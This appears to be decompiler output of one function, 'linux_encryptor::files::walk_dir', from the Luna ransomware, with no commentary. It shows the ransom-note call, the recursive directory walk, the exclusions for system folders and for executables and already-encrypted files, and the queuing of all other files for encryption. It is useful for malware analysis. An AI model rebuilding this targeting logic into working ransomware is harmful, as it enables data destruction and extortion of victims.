fn linux_encryptor::files::walk_dir(a0: u32) -> u64 {
    let v0: Option<struct24>;  // [bp-0x138], Other Possible Types: struct8, char, Result<struct16, struct10>
    let v1: Option<struct24>;  // [sp-0x138], Other Possible Types: int, unsigned long
    let v2: i64;  // [sp-0x130]
    let v3: i64;  // [sp-0x128]
    let v4: i64;  // [bp-0x108], Other Possible Types: int
    let v5: i64;  // [sp-0x100]
    let v6: i64;  // [sp-0xf8]
    let v7: Option<struct24>;  // [sp-0xf0], Other Possible Types: struct16, unsigned long
    let v8: i64;  // [sp-0xe8]
    let v9: i64;  // [sp-0xe0]
    let v10: iNone;  // [sp-0xd8], Other Possible Types: struct16, struct24
    let v11: struct16;  // [sp-0xd8], Other Possible Types: Option<struct24>, unsigned long
    let v12: i64;  // [sp-0xd0]
    let v13: i8;  // [bp-0xc0]
    let v14: iNone;  // [sp-0xb8]
    let v15: iNone;  // [sp-0xa8]
    let v16: iNone;  // [sp-0x98]
    let v17: i64;  // [sp-0x80]
    let v18: iNone;  // [bp-0x78]
    let v19: i64;  // [sp-0x60], Other Possible Types: Option<struct40>
    let v21: i64;  // rdx
    let v22: i64;  // r12
    let v23: iNone;  // ymm0
    let v24: iNone;  // ymm1
    let v25: iNone;  // ymm2
    let v26: iNone;  // xmm0
    let v27: iNone;  // xmm1
    let v28: iNone;  // xmm2
    let v29: i64;  // rax
    let v30: i64;  // rdx
    let v31: i64;  // rbp
    let v32: i64;  // rax
    let v33: i64;  // rsi
    let v34: i64;  // rbp
    let v35: i64;  // rbx
    let v36: iNone;  // xmm0
    let v37: i8;  // r12b
    let v39: i8;  // bl
    let v41: i64;  // rax
    let v42: i64;  // 4099
    let v43: i64;  // rax
    let v44: i64;  // 4099

    linux_encryptor::files::create_note();
    if std::sys::unix::fs::readdir(*(a0 as &i64), *((a0 + 16) as &i64)) {
        v19 = v21;
        goto *((4534500 + (vvar_262{reg 32} & 3) * 4) as &i32) + 4534500;
    } else {
        v22 = &v0;
        loop {
            loop {
                v19 = <std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next(&v13);
                match v19 {
                    None => {
                        v43 = v30;
                        v44 = *(v30 as &i64);
                        *(v30 as &unsigned long) = v44 - 1;
                        if BinaryOp CasCmpNE {
                            goto LABEL_0x40c584;
                        }
                        if v44 == 1 {
                            v43 = alloc::sync::Arc<T>::drop_slow(&v13);
                            return v43;
                        }
                        return v43;
                    },
                    Some(_) => {
                        v26 = v19 as i128;
                        v23 = v23 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v26 as u256;
                        v27 = *((&v19 as &char + 16) as &i128);
                        v24 = v24 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v27 as u256;
                        v28 = *((&v19 as &char + 32) as &i128);
                        v25 = v25 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v28 as u256;
                        v16 = v28;
                        v15 = v27;
                        v14 = v26;
                    },
                }
                if v14 as i64 {
                    v0 = struct8 {
                        field_0: &v14
                    };
                    core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v0, &g_473e90, "src/files.rs"); /* do not return */
                }
                std::fs::DirEntry::path(v22, &v14);
                if std::path::Path::is_dir(v1, v3) {
                    if v14 as i64 {
                        v0 = struct8 {
                            field_0: &v14
                        };
                        core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v0, &g_473e90, "src/files.rs"); /* do not return */
                    }
                    std::fs::DirEntry::path(v22, &v14);
                    v29 = std::sys::unix::os_str::Slice::to_str(v1, v3);
                    if !v29 {
                        core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
                    }
                    if !v30 {
                        v31 = 1;
                    } else {
                        v31 = __rust_alloc(v30, 1);
                    }
                    memcpy(v31, v29, v30);
                    v7 = v31;
                    v8 = v30;
                    v9 = v30;
                    v10 = <alloc::string::String as core::clone::Clone>::clone(&v7);
                    v33 = v10.field_16;
                    v22 = &v1;
                    if v12 == v33 {
                        v10 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v33, 1);
                        v33 = v10.field_16;
                    }
                    *((v11 + v33) as &i8) = 92;
                    v6 = v33 + 1;
                    v36 = v10 as i128;
                    v23 = v23 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v36 as u256;
                    v4 = v36;
                    v7 = alloc::str::<impl str>::to_lowercase(v4, v6);
                    if core::str::pattern::Pattern::is_contained_in("openserver", v7, v9) as i8 {
LABEL_40c170:
                        v39 = 0;
                        goto LABEL_40c187;
                    } else {
                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);
                        if !(!core::str::pattern::Pattern::is_contained_in("windows", v1, v3) as i8) {
                            goto LABEL_40c170;
                        }
                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);
                        if !(!core::str::pattern::Pattern::is_contained_in("program files", v1, v3) as i8) {
                            goto LABEL_40c170;
                        }
                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);
                        if !(!core::str::pattern::Pattern::is_contained_in("recycle.bin", v1, v3) as i8) {
                            goto LABEL_40c170;
                        }
                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);
                        if !(!core::str::pattern::Pattern::is_contained_in("programdata", v1, v3) as i8) {
                            goto LABEL_40c170;
                        }
                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);
                        if !(!core::str::pattern::Pattern::is_contained_in("appdata", v1, v3) as i8) {
                            goto LABEL_40c170;
                        }
                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);
                        v39 = core::str::pattern::Pattern::is_contained_in("all users", v1, v3) as i32 & 0xffffffffffffff00 | core::str::pattern::Pattern::is_contained_in("all users", v1, v3) as i32 ^ 1;
LABEL_40c187:
                        if v39 {
                            linux_encryptor::files::walk_dir(&v4);
                        }
                        goto LABEL_40c1b3;
                    }
                }
                if v14 as i64 {
                    v0 = struct8 {
                        field_0: &v14
                    };
                    core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v0, &g_473e90, "src/files.rs"); /* do not return */
                }
                std::fs::DirEntry::path(v22, &v14);
                if !std::path::Path::is_file(v1, v3) {
                    goto LABEL_40c1b3;
                }
                if v14 as i64 {
                    v0 = struct8 {
                        field_0: &v14
                    };
                    core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v0, &g_473e90, "src/files.rs"); /* do not return */
                }
                std::fs::DirEntry::path(v22, &v14);
                v32 = std::sys::unix::os_str::Slice::to_str(v1, v3);
                if !v32 {
                    core::panicking::panic("called `Option::unwrap()` on a `None` value", "src/files.rs"); /* do not return */
                }
                v34 = v30;
                if !v30 {
                    v35 = 1;
                } else {
                    v35 = __rust_alloc(v30, 1);
                }
                memcpy(v35, v32, v30);
                v4 = v35;
                v5 = v30;
                v6 = v30;
                if v2 {
                    v35 = v4;
                    v34 = v6;
                }
                v11 = alloc::str::<impl str>::to_lowercase(v35, v34);
                if core::str::pattern::Pattern::is_contained_in(".ini", v11, *((&v11 as &char + 16) as &i64)) as i8 {
                    v37 = 0;
                    goto LABEL_40c2a5;
                }
                v1 = alloc::str::<impl str>::to_lowercase(v4, v6);
                if core::str::pattern::Pattern::is_contained_in(".exe", v1, v3) as i8 {
LABEL_40c454:
                    v37 = 0;
                    goto LABEL_40c457;
                } else {
                    v1 = alloc::str::<impl str>::to_lowercase(v4, v6);
                    if !(!core::str::pattern::Pattern::is_contained_in(".dll", v1, v3) as i8) {
                        goto LABEL_40c454;
                    }
                    v1 = alloc::str::<impl str>::to_lowercase(v4, v6);
                    if !(!core::str::pattern::Pattern::is_contained_in(".lnk", v1, v3) as i8) {
                        goto LABEL_40c454;
                    }
                    v7 = alloc::str::<impl str>::to_lowercase(v4, v6);
                    v17 = v7;
                    v0 = core::str::converts::from_utf8("Luna");
                    if v1 {
                        *(&v18 as &i128) = *((&v0 as &char + 8) as &i128);
                        core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v18, &g_473eb0, "src/files.rs"); /* do not return */
                    }
                    v1 = alloc::str::<impl str>::to_lowercase(v2, v3);
                    v37 = core::str::pattern::Pattern::is_contained_in(v1, v3, v17, v9) as i32 & 0xffffffffffffff00 | core::str::pattern::Pattern::is_contained_in(v1, v3, v17, v9) as i32 ^ 1;
LABEL_40c457:
LABEL_40c2a5:
                    v22 = &v1;
                    if v37 {
                        if v14 as i64 {
                            v0 = struct8 {
                                field_0: &v14
                            };
                            core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v0, &g_473e90, "src/files.rs"); /* do not return */
                        }
                        v7 = std::fs::DirEntry::path(&v14);
                        v11 = v7;
                        println!("Encrypting file: {}", &v11);
                        linux_encryptor::files::add_file();
                    }
LABEL_40c1b3:
                    if !(!v14 as i64) {
                        continue;
                    }
                    v41 = (&v14)[8] as i64;
                    v42 = *(v41 as &i64);
                    *(v41 as &unsigned long) = v42 - 1;
                    if BinaryOp CasCmpNE {
                        goto LABEL_0x40c1ca;
                    }
                    if v42 == 1 {
                        alloc::sync::Arc<T>::drop_slow(&v14);
                    }
                    *(v16 as i64 as &i8) = 0;
                    if (&v16)[8] as i64 {
                        break;
                    }
                }
            }
        }
    }
}
